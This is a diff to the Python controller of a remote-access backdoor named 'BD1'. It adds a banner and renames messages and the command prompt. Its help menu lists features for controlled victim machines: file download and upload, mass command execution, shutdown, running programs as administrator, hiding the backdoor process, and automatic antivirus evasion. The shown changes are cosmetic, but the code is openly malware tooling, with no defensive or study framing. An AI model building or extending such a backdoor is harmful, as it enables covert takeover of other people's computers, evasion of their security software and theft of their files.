@@ -33,6 +33,15 @@ class Allclients:
         self.client_details: Dict[str, dict] = {}
         self.active_client = None
         self.security = SecureConnection()
+        ascii_art = """
+    BBBBB   DDDD    111
+    B   B   D   D    11
+    BBBBB   D   D    11
+    B   B   D   D    11
+    BBBBB   DDDD    111
+    """
+        print(ascii_art)
+        print("Version: BETA 1.0 DEV by galaxys\n")
         print(f"[+] Server started on {ip}:{port}")
 
 
@@ -161,7 +170,7 @@ class Allclients:
 
     def download_file_from_client(self, file_path):
         if not self.active_client:
-            return "[-] No active client selected"
+            return "[-] No active BD1 client selected."
         try:
             # บอกให้ client ส่งไฟล์
             connection = self.clients[self.active_client]
@@ -183,7 +192,7 @@ class Allclients:
 
     def up_file_to_client(self, file_path):
         if not self.active_client:
-            return "[-] No active client selected"
+            return "[-] No active BD1 client selected."
         try:
             # อ่านไฟล์จากโฟลเดอร์ที่อยู่
             current_dir = os.getcwd()
@@ -234,7 +243,7 @@ class Allclients:
 
     def execute_cmd(self, cmd: list):
         if not self.active_client:
-            print("[-] No active BD client selected.")
+            print("[-] No active BD1 client selected.")
             return
         
         try:
@@ -257,18 +266,18 @@ Available Commands:
     exit                     - Exit the server (✔)
 
   File Operations:
-    download <file>         - Download file from client (! but still lose stable)
-    upload <file>           - Upload file to client (! but still lose stable)
+    download <file>         - Download file from client (! has Color issue)
+    upload <file>           - Upload file to client (✔)
 
   System Control:
     allclients            - Send command all clients (✔)
     shutdown              - Shutdown client machine (✔)
     reboot                - Reboot client machine (✔)
     sysinfo               - Get system information (✔)
-    cd <path>             - Change working directory (! but still lose stable)
+    cd <path>             - Change working directory (✔)
 
   Evade & Hide:
-    runas <program> [args]     - Run program as administrator (✔)
+    runadmin <program> [args]     - Run program as administrator (✔)
     hideself (Auto)            - Hide BD1 process (✔)
     evadeanti (Auto)           - Apply antivirus evasion techniques (✔)
 
@@ -291,7 +300,7 @@ Available Commands:
         accept_thread.start()        
         while True:
             try:
-                cmd = input("Type me >>> : ").strip()
+                cmd = input("BD1 >>> : ").strip()
                 if not cmd:
                     continue
 
